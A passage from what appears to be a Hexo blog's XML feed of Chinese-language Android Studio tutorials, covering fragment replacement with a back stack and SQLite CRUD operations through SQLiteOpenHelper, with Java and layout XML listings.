class="hljs-keyword">new</span> RightFragment());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>        <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>            <span class="hljs-keyword">case</span> R.id.button:<br>                replaceFragment(<span class="hljs-keyword">new</span> AnotherRightFragment());<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">replaceFragment</span><span class="hljs-params">(Fragment fragment)</span></span>&#123;<br>        <span class="hljs-comment">//动态添加碎片分为五部，第一步创建待添加的碎片实例，获取manager 第二步开始事务通过调用 4.向容器内添加碎片 传入id和待添加实例</span><br>        <span class="hljs-comment">//五提交事务</span><br>        FragmentManager fragmentManager=getSupportFragmentManager();<br>        FragmentTransaction transaction=fragmentManager.beginTransaction();<br>        transaction.replace(R.id.right_layout,fragment);<br>        transaction.commit();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">fragment</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/left_fragment&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.example.fragmentmd.LeftFragment&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/right_layout&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">&quot;1&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>activity_another_right_fragment.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;#ffff00&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;20sp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;动态的fragment&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="模拟返回栈"><a href="#模拟返回栈" class="headerlink" title="模拟返回栈"></a>模拟返回栈</h2><p>即点击back可以返回上一个界面而不是退出</p><p>相关代码</p><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fragmentmd;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentManager;<br><span class="hljs-keyword">import</span> androidx.fragment.app.FragmentTransaction;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">View</span>.<span class="hljs-title">OnClickListener</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        Button button=(Button)findViewById(R.id.button);<br>        button.setOnClickListener(<span class="hljs-keyword">this</span>);<br>        replaceFragment(<span class="hljs-keyword">new</span> RightFragment());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>        <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>            <span class="hljs-keyword">case</span> R.id.button:<br>                replaceFragment(<span class="hljs-keyword">new</span> AnotherRightFragment());<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">replaceFragment</span><span class="hljs-params">(Fragment fragment)</span></span>&#123;<br>        FragmentManager fragmentManager=getSupportFragmentManager();<br>        FragmentTransaction transaction=fragmentManager.beginTransaction();<br>        transaction.replace(R.id.right_layout,fragment);<br>        <span class="hljs-comment">//设置返回的内容</span><br>        transaction.addToBackStack(<span class="hljs-keyword">null</span>);<br>        transaction.commit();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 数据库操作</title>
    <link href="/2021/04/02/AndroidStudio/Android%20Studio%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/04/02/AndroidStudio/Android%20Studio%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-数据库操作"><a href="#Android-Studio-数据库操作" class="headerlink" title="Android Studio 数据库操作"></a>Android Studio 数据库操作</h1><h2 id="相关描述"><a href="#相关描述" class="headerlink" title="相关描述"></a>相关描述</h2><p>我们可以对数据进行的操作有4种，即CRUD</p><p>C代表添加(Create) ，R代表(Retrieve) ,U代表更新(Update) ,D代表删除(Delete)</p><p>每一种操作又各自对应了一种SQL命令，如果你熟悉SQL语言的话，<br>一定知道添加数据时使用insert，查询数据时使用select，更新数据时使用update，删除数据时使用delete但是开发者的水平总是参差不齐的，未必每一个人都能非常熟悉的使用SQL语言，<br>因此Android也提供了一系列辅助性方法，使得在Android种即使不去编写SQL语句，也可以轻松完成</p><p>前面我们已经知道，调用SQLiteOpenHelper的<br>getReadableDatabase ()或getWritableDatabase (),方法可以用于创建和升级数据库的<br>不仅如此，这两个方法还都会返回一个SQLiteDatabase的对象，借助这个对象就可以进行CRUD操作了SQLiteDatabase种提供了一个insert ()方法，这个方法就是专门用于添加数据的，<br>它接收3个参数，第一个参数是表名，我们希望向哪张表里添加数据，这里就传入该表的名字<br>第二个参数用于在未指定添加数据的情况下给某些可为空的列自动赋值NULL，一般我们用不到这个功能，直接传入null第三个参数是一个ContentValues对象，它提供了一系列的put()方法重载,<br>用于向ContentValues中添加数据<br>只需要将表中的每个列名以及相应的待添加数据传入即可</p><h2 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h2><p>MainActivity.class</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.databasetest;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.ContentValues;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.database.Cursor;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteDatabase;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteOpenHelper;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.os.strictmode.SqliteObjectLeakedViolation;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><br><span class="hljs-keyword">import</span> java.sql.SQLDataException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-comment">//声明需要的按钮及相关类</span><br>    <span class="hljs-keyword">private</span> MyDatabaseHelper dbHelper;<br>    <span class="hljs-keyword">private</span> Button button=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> Button insert=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> Button updata=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> Button delete=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> Button select=<span class="hljs-keyword">null</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-comment">//第二个数据库名，第三个返回一个自定义的langs，四版本号</span><br>        dbHelper=<span class="hljs-keyword">new</span> MyDatabaseHelper(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;BookStore.dp&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-number">1</span>);<br>        button=(Button)findViewById(R.id.button);<br>        button.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">//SQLiteOpenHelper dpHelper = null;</span><br>                dbHelper.getWritableDatabase();<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">//插入按钮获取</span><br>        insert=(Button)findViewById(R.id.button_insert);<br>        insert.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                SQLiteDatabase db=dbHelper.getWritableDatabase();<br>                ContentValues values=<span class="hljs-keyword">new</span> ContentValues();<br>                values.put(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;Android Studio&quot;</span>);<br>                values.put(<span class="hljs-string">&quot;author&quot;</span>,<span class="hljs-string">&quot;ll&quot;</span>);<br>                values.put(<span class="hljs-string">&quot;pages&quot;</span>,<span class="hljs-number">400</span>);<br>                values.put(<span class="hljs-string">&quot;price&quot;</span>,<span class="hljs-number">45</span>);<br>                <span class="hljs-comment">//插入的表 空的列表 内容</span><br>                db.insert(<span class="hljs-string">&quot;Book&quot;</span>,<span class="hljs-keyword">null</span>,values);<br>                values.clear();<br>                values.put(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;Android Studio DataBase&quot;</span>);<br>                values.put(<span class="hljs-string">&quot;author&quot;</span>,<span class="hljs-string">&quot;lwx&quot;</span>);<br>                values.put(<span class="hljs-string">&quot;pages&quot;</span>,<span class="hljs-number">40</span>);<br>                values.put(<span class="hljs-string">&quot;price&quot;</span>,<span class="hljs-number">5</span>);<br>                db.insert(<span class="hljs-string">&quot;Book&quot;</span>,<span class="hljs-keyword">null</span>,values);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">//修改数据</span><br>        updata=(Button)findViewById(R.id.button_updata);<br>        updata.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                SQLiteDatabase db=dbHelper.getWritableDatabase();<br>                ContentValues values=<span class="hljs-keyword">new</span> ContentValues();<br>                values.put(<span class="hljs-string">&quot;price&quot;</span>,<span class="hljs-number">10.3</span>);<br>                <span class="hljs-comment">//修改的表 修改的内容 修改的判断语句 语句的变量内容</span><br>                db.update(<span class="hljs-string">&quot;Book&quot;</span>,values,<span class="hljs-string">&quot;name=?&quot;</span>,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;Android Studio&quot;</span>&#125;);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">//删除</span><br>        delete=(Button)findViewById(R.id.button_delete);<br>        delete.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                SQLiteDatabase db=dbHelper.getWritableDatabase();<br>                <span class="hljs-comment">//删除的表 删除的判断语句 判断的内容</span><br>                db.delete(<span class="hljs-string">&quot;Book&quot;</span>,<span class="hljs-string">&quot;pages&gt;?&quot;</span>,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;50&quot;</span>&#125;);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">//查询</span><br>        select=(Button)findViewById(R.id.button_select);<br>        select.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                SQLiteDatabase db=dbHelper.getWritableDatabase();<br>                <span class="hljs-comment">//查询的表 查询列 三四查询某一（几）行 5：groupBy 6：Having 7:orderBy</span><br>                Cursor cursor=db.query(<span class="hljs-string">&quot;Book&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>                <span class="hljs-keyword">if</span>(cursor.moveToFirst())&#123;<br>                    <span class="hljs-keyword">do</span>&#123;<br>                        String name=cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;name&quot;</span>));<br>                        String author=cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;author&quot;</span>));<br>                        String pages=cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;pages&quot;</span>));<br>                        String price=cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;price&quot;</span>));<br>                        <span class="hljs-comment">//String name=cursor.getString(cursor.getColumnIndex(&quot;name&quot;));</span><br>                        Log.v(<span class="hljs-string">&quot;MainActivity&quot;</span>,<span class="hljs-string">&quot;book name is:&quot;</span>+name);<br>                        Log.v(<span class="hljs-string">&quot;MainActivity&quot;</span>,<span class="hljs-string">&quot;book author is:&quot;</span>+author);<br>                        Log.v(<span class="hljs-string">&quot;MainActivity&quot;</span>,<span class="hljs-string">&quot;book page is:&quot;</span>+pages);<br>                        Log.v(<span class="hljs-string">&quot;MainActivity&quot;</span>,<span class="hljs-string">&quot;book price is:&quot;</span>+price);<br>                    &#125;<span class="hljs-keyword">while</span> (cursor.moveToNext());<br>                &#125;<br>                cursor.close();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>MyDatabaseHelper.class</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.databasetest;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.database.ContentObservable;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteDatabase;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteOpenHelper;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteTransactionListener;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyDatabaseHelper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SQLiteOpenHelper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String CREAT_BOOK=<span class="hljs-string">&quot;Create table Book(&quot;</span><br>            +<span class="hljs-string">&quot;id integer primary key autoincrement,&quot;</span><br>            +<span class="hljs-string">&quot;author text,&quot;</span><br>            +<span class="hljs-string">&quot;price real,&quot;</span><br>            +<span class="hljs-string">&quot;pages integer,&quot;</span><br>            +<span class="hljs-string">&quot;name text)&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String CREATE_CATEGORY=<span class="hljs-string">&quot;create table Category(&quot;</span><br>            +<span class="hljs-string">&quot;id integer primary key autoincrement,&quot;</span><br>            +<span class="hljs-string">&quot;category_name text,&quot;</span><br>            +<span class="hljs-string">&quot;category_code integer)&quot;</span>;<br>    <span class="hljs-keyword">private</span> Context mContext;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyDatabaseHelper</span><span class="hljs-params">(Context context,String name,SQLiteDatabase.CursorFactory factory,<span class="hljs-keyword">int</span> version)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(context,name,factory,version);<br>        mContext=context;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(SQLiteDatabase db)</span> </span>&#123;<br>        db.execSQL(CREAT_BOOK);<br>        db.execSQL(CREATE_CATEGORY);<br>        Toast.makeText(mContext,<span class="hljs-string">&quot;Create succeeded&quot;</span>,Toast.LENGTH_SHORT).show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onUpgrade</span><span class="hljs-params">(SQLiteDatabase db, <span class="hljs-keyword">int</span> oldVersion, <span class="hljs-keyword">int</span> newVersion)</span> </span>&#123;<br>        db.execSQL(<span class="hljs-string">&quot;drop table if exists Book&quot;</span>);<br>        db.execSQL(<span class="hljs-string">&quot;drop table if exists Category&quot;</span>);<br>        onCreate(db);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span 